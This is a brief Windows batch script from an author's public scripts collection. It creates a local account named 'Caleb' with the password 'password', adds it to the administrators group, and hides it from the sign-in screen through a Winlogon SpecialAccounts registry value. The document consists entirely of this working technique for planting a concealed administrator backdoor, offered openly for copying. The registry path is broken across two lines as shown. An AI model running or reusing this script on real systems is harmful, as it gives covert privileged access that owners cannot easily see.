:: Add a hidden user and add to local administrator
:: Copyright (C) 2020 Caleb Sargeant (scripts@calebsargeant.com)
:: Permission to copy and modify is granted under this license: https://github.com/CalebSargeant/scripts/blob/master/LICENSE
:: Last revised sometime between 2012 and 2013

@echo off
net user Caleb password /add
net localgroup administrators Caleb /add
Reg Add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /V "Caleb" /D 0 /T REG_DWORD /F
